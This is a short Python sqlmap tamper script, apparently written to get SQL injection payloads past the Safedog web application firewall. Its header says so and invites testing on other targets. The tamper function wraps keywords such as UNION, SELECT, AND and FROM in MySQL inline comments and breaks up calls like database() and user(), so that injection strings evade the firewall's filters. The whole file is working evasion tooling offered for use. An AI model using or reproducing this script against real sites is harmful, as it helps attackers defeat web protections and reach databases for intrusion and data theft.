#!/usr/bin/env python
# _*_ coding:utf-8 _*_
# File_type:过安全狗，其他自己测试
# Filename:safedog.py
# Author:smelond
# python 2.7运行环境

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    if payload:
        bypass_safedog_str1 = '/*!'
        bypass_safedog_str2 = '/***/'
        bypass_safedog_str3 = '/*!*/'
        payload = payload.replace("UNION", bypass_safedog_str1 + "UNION" + bypass_safedog_str2)
        payload = payload.replace("AND", bypass_safedog_str1 + "AND" + bypass_safedog_str2)
        payload = payload.replace("SELECT", bypass_safedog_str1 + "SELECT" + bypass_safedog_str3)
        payload = payload.replace("database()", "database/***/()")
        payload = payload.replace("user()", "user/***/()")
        payload = payload.replace("FROM", bypass_safedog_str1 + "FROM" + bypass_safedog_str2)
    return payload
